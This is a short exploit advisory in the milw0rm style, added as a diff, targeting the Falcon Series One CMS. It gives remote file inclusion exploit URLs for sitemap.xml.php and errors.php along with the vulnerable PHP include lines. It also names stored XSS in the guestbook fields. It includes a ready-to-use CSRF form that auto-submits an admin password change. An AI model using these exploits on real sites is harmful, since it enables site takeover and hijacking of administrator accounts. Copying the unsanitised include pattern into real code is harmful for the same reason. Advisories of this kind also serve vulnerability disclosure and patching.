@@ -1,0 +1,35 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __  
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  | 
+ |___|___|  /\__|  /______  /\___  >__|            |___||__| 
+          \/\______|      \/     \/                          
+---------------------------------------------------------------
+Http://www.inj3ct-it.org     Staff[at]inj3ct-it[dot]org 
+---------------------------------------------------------------
+  Multilple Remote File Inclusion - Permanent Xss
+---------------------------------------------------------------
+# Author: MhZ91
+# Title: Falcon Series One - Multilple Remote File Inclusion + Permanent Xss
+# Download: http://sourceforge.net/projects/falconcms/
+# Bug: Multilple Remote File Inclusion + Permanent Xss
+# Severity: High
+# Visit: http://www.inj3ct-it.org
+---------------------------------------------------------------
+Exploit: http://[site]/sitemap.xml.php?dir[classes]=[Evil_Code]
+Vuln code: @include_once ($dir['classes']."class.pages.php");
+---------------------------------------------------------------
+Exploit: http://[site]/errors.php?error=[Evil_Code]
+Vuln code: <?include($_REQUEST["error"] . "/errors.php");?>
+---------------------------------------------------------------
+Permanent Xss at http://[site]/index.php?guestbook=v in the input gb_mail, gb_name and textarea gb_text your [Xss] and after the xss work here index.php?guestbook=v :p
+---------------------------------------------------------------
+Simple 1337 Csrf exploit:
+<form name="form_change" action="http://[site]/index.php?admin=changepass" method="post">
+<input type="hidden" name="f_pass" class="field" value="[YourPWD]" />
+<input type="hidden" name="f_pass2" class="field" value="[YourPWD]" />
+</form><script>document.form_change.submit()</script>
+There is other more csrf and permanent xss.. 
+
+# milw0rm.com [2007-12-10]
